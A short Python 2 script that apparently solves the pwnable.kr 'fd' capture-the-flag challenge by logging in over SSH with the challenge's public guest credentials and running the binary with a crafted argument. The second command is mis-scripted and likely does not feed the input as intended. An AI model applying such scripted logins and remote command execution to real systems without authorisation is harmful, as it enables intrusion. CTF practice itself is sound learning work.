

#Getting the key
import paramiko
ssh = paramiko.SSHClient()
ssh.load_system_host_keys()
ssh.connect('pwnable.kr', port=2222, username='fd', password='guest')
ssh_stdin, ssh_stdout, ssh_stderr = ssh.exec_command("./fd 4660")
#ssh_stdin, ssh_stdout, ssh_stderr = ssh.exec_command("LETMEWIN\n")
#ssh_stdin.close()
print "*********** Flag ****************"
for line in ssh_stdout.read().splitlines():
    print(line)
ssh_stdin, ssh_stdout, ssh_stderr = ssh.exec_command("LETMEWIN\n")
for line in ssh_stdout.read().splitlines():
    print(line)
ssh_stdin.close()

